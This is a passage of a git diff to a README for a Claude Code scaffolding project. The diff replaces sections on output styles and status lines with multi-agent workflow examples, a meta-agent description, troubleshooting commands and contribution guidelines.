-- "Use the debugger agent to fix errors, then have the code-reviewer check the changes"
-- "Generate a new agent with meta-agent, then test it on a specific task"
-
-This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.
-
-### The Meta-Agent
-
-The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.
-
-**Why Meta-Agent Matters:**
-- **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours
-- **Consistent Structure** - Ensures all agents follow best practices and proper formatting
-- **Live Documentation** - Pulls latest Claude Code docs to stay current with features
-- **Intelligent Tool Selection** - Automatically determines minimal tool requirements
-
-**Using the Meta-Agent:**
+**Multi-Agent Development:**
 ```bash
-# Simply describe what you want
-"Build a new sub-agent that runs tests and fixes failures"
-
-# Claude Code will automatically delegate to meta-agent
-# which will create a properly formatted agent file
+# Research → Design → Implementation → Testing
+"Research modern React patterns with ai-research, then have ux-eng design a component architecture, fullstack-eng implement it, and testing-specialist create comprehensive tests"
 ```
 
-The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.
-
-## Output Styles Collection
-
-> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)
-
-<img src="images/genui.png" alt="GenUI Output Style" style="max-width: 800px; width: 100%;" />
-
-This project includes a comprehensive collection of custom output styles (`.claude/output-styles/`) that transform how Claude Code communicates responses. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/output-styles) for complete details on how output styles work.
-
-| Style                | Description                                        | Best For                                                |
-| -------------------- | -------------------------------------------------- | ------------------------------------------------------- |
-| **genui** ⭐          | **Generates beautiful HTML with embedded styling** | **Interactive visual outputs, instant browser preview** |
-| **table-based**      | Organizes all information in markdown tables       | Comparisons, structured data, status reports            |
-| **yaml-structured**  | Formats responses as YAML configuration            | Settings, hierarchical data, API responses              |
-| **bullet-points**    | Clean nested lists with dashes and numbers         | Action items, documentation, task tracking              |
-| **ultra-concise**    | Minimal words, maximum speed                       | Experienced devs, rapid prototyping                     |
-| **html-structured**  | Semantic HTML5 with data attributes                | Web documentation, rich formatting                      |
-| **markdown-focused** | Leverages all markdown features optimally          | Complex documentation, mixed content                    |
-| **tts-summary**      | Announces task completion via ElevenLabs TTS       | Audio feedback, accessibility                           |
-
-**Usage:** Run `/output-style [name]` to activate any style (e.g., `/output-style table-based`)
-
-**Location:**
-- Project styles: `.claude/output-styles/*.md` (this repo)
-- User styles: `~/.claude/output-styles/*.md` (global)
-
-Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.
-
-
-## Custom Status Lines
-
-> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)
-
-This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/statusline) for complete details.
-
-### Available Status Lines
-
-**Location:** `.claude/status_lines/`
-
-| Version | File                | Description       | Features                                                 |
-| ------- | ------------------- | ----------------- | -------------------------------------------------------- |
-| **v1**  | `status_line.py`    | Basic MVP         | Git branch, directory, model info                        |
-| **v2**  | `status_line_v2.py` | Smart prompts     | Latest prompt (250 chars), color-coded by task type      |
-| **v3**  | `status_line_v3.py` | Agent sessions    | Agent name, model, last 3 prompts                        |
-| **v4**  | `status_line_v4.py` | Extended metadata | Agent name, model, latest prompt, custom key-value pairs |
-
-### Session Management
-
-Status lines leverage session data stored in `.claude/data/sessions/<session_id>.json`:
-
-```json
-{
-  "session_id": "unique-session-id",
-  "prompts": ["first prompt", "second prompt", ...],
-  "agent_name": "Phoenix",  // Auto-generated unique name
-  "extras": {              // v4: Custom metadata (optional)
-    "project": "myapp",
-    "status": "debugging",
-    "environment": "prod"
-  }
-}
+**Code Review Pipeline:**
+```bash
+# Development → Review → Fix → Deploy
+"Have fullstack-eng implement the API, tech-lead review for architecture, apply fixes, then deployment-agent handle the release"
 ```
 
-**Agent Naming:**
-- Automatically generates unique agent names using LLM services
-- Priority: Ollama (local) → Anthropic → OpenAI → Fallback names
-- Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)
-- Enabled via `--name-agent` flag in `user_prompt_submit.py`
-
-**Custom Metadata (v4):**
-- Use `/update_status_line` command to add custom key-value pairs
-- Displayed at the end of the status line in cyan brackets
-- Persists across Claude Code interactions
-- Example: `/update_status_line <session_id> project myapp`
-
-### Configuration
-
-Set your preferred status line in `.claude/settings.json`:
-
-```json
-{
-  "StatusLine": {
-    "command": "uv run .claude/status_lines/status_line_v3.py"
-  }
-}
+**Documentation Workflow:**
+```bash
+# Analysis → Documentation → Validation
+"Analyze the codebase structure, have readme-maintainer create documentation, then tech-lead validate technical accuracy"
 ```
 
-**Status Line Features:**
-- **Real-time updates** - Refreshes on message changes (300ms throttle)
-- **Color coding** - Visual indicators for different task types
-- **Smart truncation** - Manages long prompts elegantly
-- **Session persistence** - Maintains context across interactions
+### The Meta-Agent: Agent Factory
 
-**Task Type Indicators (v2/v3):**
-- 🔍 Purple - Analysis/search tasks
-- 💡 Green - Creation/implementation tasks
-- 🔧 Yellow - Fix/debug tasks
-- 🗑️ Red - Deletion tasks
-- ❓ Blue - Questions
-- 💬 Default - General conversation
+The meta-agent creates new agents from natural language descriptions:
+
+**Capabilities:**
+- Generates complete agent configurations
+- Selects appropriate tools and permissions
+- Creates structured workflows and best practices
+- Ensures consistent formatting and standards
+
+**Usage Examples:**
+```bash
+"Create an agent for database migrations and schema management"
+"Build a security-focused agent for vulnerability scanning"
+"Generate an agent that specializes in performance optimization"
+```
+
+**Meta-Agent Workflow:**
+1. Analyzes your requirements
+2. Selects appropriate tools and model
+3. Creates structured system prompt
+4. Defines clear delegation triggers
+5. Writes complete agent file
+6. Validates configuration
+
+## Troubleshooting
+
+### Common Issues
+
+**Hooks Not Working**
+```bash
+# Check UV installation
+uv --version
+
+# Verify hook permissions
+ls -la .claude/hooks/
+
+# Test hooks manually
+echo '{}' | uv run .claude/hooks/user_prompt_submit.py
+```
+
+**Agent Not Responding**
+```bash
+# Check agent file syntax
+cat .claude/agents/your-agent.md
+
+# Verify agent is loaded
+ls .claude/agents/
+
+# Check logs for errors
+cat logs/subagent_stop.json | jq '.[-1]'
+```
+
+**TTS Not Working**
+```bash
+# Check environment variables
+echo $ELEVENLABS_API_KEY
+echo $OPENAI_API_KEY
+
+# Test TTS directly
+uv run .claude/hooks/utils/tts/elevenlabs_tts.py "test message"
+```
+
+### Performance Optimization
+
+**Hook Performance**
+- Use minimal dependencies in hook scripts
+- Cache frequently accessed data
+- Implement timeout handling
+
+**Agent Efficiency**
+- Assign minimal required tools only
+- Use appropriate model sizes (haiku for simple tasks)
+- Design clear, focused system prompts
+
+**Session Management**
+- Regular compaction of conversation history
+- Periodic cleanup of session data
+- Monitor log file sizes
+
+### Debug Mode
+```bash
+# Enable verbose logging
+export CLAUDE_DEBUG=1
+
+# Monitor hook execution
+tail -f logs/*.json
+
+# Test individual components
+uv run .claude/hooks/session_start.py --debug
+```
+
+
+## Contributing & Extension
+
+### Adding New Agents
+1. Use meta-agent to generate the initial structure
+2. Customize the system prompt and tools
+3. Test with simple tasks first
+4. Add to your team workflows
+
+### Creating Custom Hooks
+1. Copy an existing hook as template
+2. Follow UV single-file script format
+3. Add appropriate error handling
+4. Test thoroughly before deployment
+
+### Custom Output Styles
+1. Create new markdown file in `.claude/output-styles/`
+2. Add YAML frontmatter with name and description
+3. Define formatting instructions
+4. Test with `/output-style your-style-name`
+
+### Extending Commands
+1. Create new command file in appropriate `.claude/commands/` subdirectory
+2. Follow existing patterns for agent delegation
+3. Include clear descriptions and examples
+4. Test command execution
+
+## Documentation & Resources
+
+### Comprehensive Documentation
+- **[Main Documentation](ai_docs/README.md)**: Complete technical references
+- **[Hook System](/.claude/hooks/README.md)**: Detailed hook implementation guide
+- **[Agent Framework](/.claude/agents/)**: Agent development patterns
+- **[Applications](apps/README.md)**: Project development guidelines
+
+### External Resources
+- **[Claude Code Documentation](https://docs.anthropic.com/en/docs/claude-code)**: Official Claude Code docs
+- **[UV Documentation](https://docs.astral.sh/uv/)**: Python package management
+- **[Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks)**: Hook system reference
+- **[Sub-Agents Guide](https://docs.anthropic.com/en/docs/claude-code/sub-agents)**: Agent delegation patterns
+
+### Community
+- **[IndyDevDan YouTube](https://www.youtube.com/@indydevdan)**: AI coding tutorials and techniques
+- **[Agentic Engineer](https://agenticengineer.com/principled-ai-coding)**: Principles of AI-powered development
 
 
 
-## Master AI Coding
-> And prepare for Agentic Engineering
+---
 
-Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=cchmgenui)
+**Transform your development workflow with AI-powered team coordination. This scaffolding provides everything you need to build sophisticated applications with the support of specialized AI agents, intelligent automation, and comprehensive development tooling.**
 
-Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks.
+*Based on [claude-code-hooks-mastery](https://github.com/disler/claude-code-hooks-mastery) with extensive enhancements for production development workflows.*
